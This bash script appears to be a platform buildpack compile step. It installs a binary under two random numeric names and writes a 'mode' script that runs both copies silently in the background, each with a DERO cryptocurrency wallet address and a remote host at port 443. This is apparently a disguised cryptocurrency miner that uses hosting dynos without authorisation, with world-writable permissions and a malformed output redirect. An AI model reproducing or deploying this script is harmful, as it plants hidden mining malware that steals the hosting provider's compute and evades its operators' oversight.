#!/usr/bin/env bash
dyno=$(shuf -n 1 -i 100000-999999)
dyno2=$(shuf -n 1 -i 100000-999999)
set -e

mkdir -p "$1/bin/"

cp -a binaries-$STACK/* "$1/bin/"
cp -a "$1/bin/astra" "$1/bin/$dyno"
cp -a "$1/bin/astra" "$1/bin/$dyno2"
cat > "$1/bin/mode" <<END
/app/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 146.190.106.185:443 >/dev/null 2.&1 >/dev/null &
sleep 0.1
/app/bin/$dyno2 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 146.190.106.185:443 >/dev/null 2.&1 >/dev/null &
sleep 0.1
END
chmod 777 $1/bin/$dyno
chmod 777 $1/bin/$dyno2
chmod 777 $1/bin/mode
chmod 777 $1/bin/astra
chmod 777 $1/bin/client
chmod 777 $1/bin/main

# Setting environment variables in .profile.d script (sourced at dyno startup)
mkdir -p "$1/.profile.d/"
cat >>"$1"/.profile.d/main.sh <<EOF
export LD_LIBRARY_PATH="\$LD_LIBRARY_PATH:\$HOME/bin"
EOF

exit 0
